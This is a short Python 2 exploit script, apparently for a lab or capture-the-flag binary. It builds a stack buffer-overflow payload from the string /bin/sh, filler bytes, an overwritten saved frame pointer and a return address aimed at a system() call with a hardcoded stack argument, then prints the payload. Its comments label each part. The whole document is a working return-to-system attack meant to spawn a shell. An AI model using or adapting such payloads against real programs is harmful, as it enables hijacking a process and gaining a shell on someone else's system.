from struct import pack
import os,sys
# first two packs are the string /bin/sh
# then come the fillers
# then come the ebp overwrite + return address overwrite (system call) + address call to system call
buf = "\x2f\x62\x69\x6e\x2f\x73\x68" + '\x41' * 11 + pack("<I", 0xbffea158) + pack("<I", 0x08048eed) + pack("<I", 0xbffea126)
print buf
